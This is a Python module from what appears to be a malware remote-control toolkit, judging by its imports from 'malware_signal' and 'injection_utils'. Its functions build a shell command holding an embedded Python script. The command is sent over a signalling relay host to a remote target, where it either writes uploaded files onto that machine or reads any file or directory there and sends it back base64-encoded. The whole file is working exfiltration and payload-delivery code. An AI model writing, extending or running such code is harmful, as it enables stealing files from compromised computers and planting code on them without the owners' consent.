import asyncio
import base64
import json
import textwrap
from pathlib import Path

from malware_signal.signal import SignalClient
from injection_utils.remote_command_handler import RemoteCommandHandler as SenderHandler
from core.data.config import HOST, ROOM
from core.data.client import client_id, username


def build_transfer_payload(source_path, remote_path, mode="upload"):
    source = Path(source_path)
    if not source.exists():
        print(f"PATH NOT FOUND: {source_path}")

    remote_path = str(remote_path)

    if source.is_file():
        data = source.read_bytes()
        return {
            "type": "file-transfer",
            "mode": mode,
            "path": remote_path,
            "is_directory": False,
            "filename": source.name,
            "size": len(data),
            "content": base64.b64encode(data).decode("ascii"),
        }

    if source.is_dir():
        files = {}
        for path in sorted(source.rglob("*")):
            if path.is_file():
                rel_path = path.relative_to(source).as_posix()
                files[rel_path] = base64.b64encode(path.read_bytes()).decode("ascii")

        return {"type": "file-transfer", "mode": mode, "path": remote_path, "is_directory": True, "content": files}

    raise ValueError(f"UNSUPPORTED PATH TYPE: {source_path}")


def build_transfer_command(payload):
    payload_json = json.dumps(payload)
    script = textwrap.dedent(
        f"""
        import base64
        import json
        import os
        from pathlib import Path

        payload = json.loads({payload_json!r})
        path = payload["path"]

        if payload.get("mode") == "upload":
            target = Path(path)
            if not payload.get("is_directory"):
                if target.exists() and target.is_dir():
                    target = target / payload.get("filename", target.name)
                elif str(path).endswith("/"):
                    target = target / payload.get("filename", target.name)
            target.parent.mkdir(parents=True, exist_ok=True)
            if payload.get("is_directory"):
                target.mkdir(parents=True, exist_ok=True)
                for rel_path, encoded in payload.get("content", {{}}).items():
                    file_path = target / rel_path
                    file_path.parent.mkdir(parents=True, exist_ok=True)
                    file_path.write_bytes(base64.b64decode(encoded))
            else:
                target.write_bytes(base64.b64decode(payload["content"]))
            print(json.dumps({{"status": "success", "path": str(target), "mode": "upload"}}))
        else:
            source = Path(path)
            if source.is_file():
                data = source.read_bytes()
                response = {{
                    "type": "file-transfer",
                    "mode": "download",
                    "path": path,
                    "is_directory": False,
                    "size": len(data),
                    "content": base64.b64encode(data).decode("ascii"),
                }}
            elif source.is_dir():
                files = {{}}
                for item in sorted(source.rglob("*")):
                    if item.is_file():
                        rel_path = item.relative_to(source).as_posix()
                        files[rel_path] = base64.b64encode(item.read_bytes()).decode("ascii")
                response = {{
                    "type": "file-transfer",
                    "mode": "download",
                    "path": path,
                    "is_directory": True,
                    "content": files,
                }}
            else:
                raise FileNotFoundError(path)
            print(json.dumps(response))
        """
    )
    return f"python3 - <<'PY'\n{script}\nPY"


async def _run_transfer(target, payload, timeout=120):
    signal = SignalClient(ROOM, client_id, HOST, username=username)

    await signal.connect()
    sender = SenderHandler(signal)

    try:
        return await sender.send_command(target=target, command=build_transfer_command(payload), wait_for_result=True, timeout=timeout)
    except asyncio.TimeoutError:
        print("[-] FILE TRANSFER REQUEST TIMED OUT")
        return None
    finally:
        await signal.close()